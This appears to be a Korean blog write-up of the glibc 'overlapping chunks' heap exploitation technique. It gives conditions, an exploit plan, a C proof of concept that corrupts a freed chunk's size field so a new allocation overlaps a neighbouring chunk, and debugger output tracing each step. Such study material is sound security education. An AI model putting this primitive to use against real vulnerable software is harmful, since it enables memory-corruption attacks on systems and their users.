---
title: Overlapping Chunks
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, overlapping chunks]
math: true
mermaid: true
---

## Conditions

- 공격자에 의해 free chunk을 생성할 수 있어야 함
- 공격자에 의해 free chunk의 `size` 영역에 값을 저장할 수 있어야 함

## Exploit plan

1. 3개의 heap 영역을 생성
2. 2번째 heap 영역을 해제
3. free chunk의 `size` 영역에 재할당 받을 크기 값을 저장
4. 할당받기 원하는 크기의 heap 영역 할당
    - 이를 통해 3번째 영역에 값을 덮어쓸 수 있음

## Proof of concept

```c
/*
 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){

    intptr_t *p1,*p2,*p3,*p4;

    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
    fprintf(stderr, "\nThis is a simple chunks overlapping problem\n\n");
    fprintf(stderr, "Let's start to allocate 3 chunks on the heap\n");

    p1 = malloc(0x100 - 8);
    p2 = malloc(0x100 - 8);
    p3 = malloc(0x80 - 8);

    fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

    memset(p1, '1', 0x100 - 8);
    memset(p2, '2', 0x100 - 8);
    memset(p3, '3', 0x80 - 8);

    fprintf(stderr, "\nNow let's free the chunk p2\n");
    free(p2);
    fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

    fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
    fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"
        " however, it is best to maintain the stability of the heap.\n");
    fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
        " to assure that p1 is not mistaken for a free chunk.\n");

    int evil_chunk_size = 0x181;
    int evil_region_size = 0x180 - 8;
    fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
         evil_chunk_size, evil_region_size);

    *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2

    fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"
           "size of the chunk p2 injected size\n");
    fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"
           "is parked in the unsorted bin which size has been modified by us\n");
    p4 = malloc(evil_region_size);

    fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
    fprintf(stderr, "p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
    fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.\n");

    fprintf(stderr, "\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
        " and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

    fprintf(stderr, "Let's run through an example. Right now, we have:\n");
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);

    fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
    memset(p4, '4', evil_region_size);
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);

    fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
    memset(p3, '3', 80);
    fprintf(stderr, "p4 = %s\n", (char *)p4);
    fprintf(stderr, "p3 = %s\n", (char *)p3);
}
```

3개의 heap 영역 생성 후 `memset()` 함수 호출

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x100                Used                None              None
0x603100            0x0                 0x100                Used                None              None
0x603200            0x0                 0x80                 Used                None              None
```

```
The 3 chunks have been allocated here:
p1=0x603010
p2=0x603110
p3=0x603210
```

`p2`를 `free()`한다.

```
Now let's free the chunk p2
```

unsorted bin에 `p2` 등록된다.

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x603280 (size : 0x20d80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x603100 (size : 0x100)
```

```
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us
a region size of 376
```

`free()`된 `p2`의 `size`를 변조한다.

```
gdb-peda$ x/24gx 0x603100
0x603100:   0x3131313131313131  0x0000000000000181
0x603110:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
```

변조한 size로 `malloc()` 시 `p2` 영역이 해당 size로 재할당된다.

```
Now let's allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us
p4 has been allocated at 0x603110 and ends at 0x603288
p3 starts at 0x603210 and ends at 0x603288
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.
```

`p4`를 이용해 `p3` 영역을 덮어쓸 수 있다.

```
Let's run through an example. Right now, we have:
p4 = x
p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 

If we memset(p4, '4', 376), we have:
p4 =    444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444   444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444    44444444444444444444444444444444444444444444444444 
p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444 

And if we then memset(p3, '3', 80), we have:
p4 =    444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444   444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333    33333333334444444444444444444444444444444444444444 
p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444 
```

## References
- [Overlapping chunks](https://www.lazenca.net/display/TEC/Overlapping+chunks)
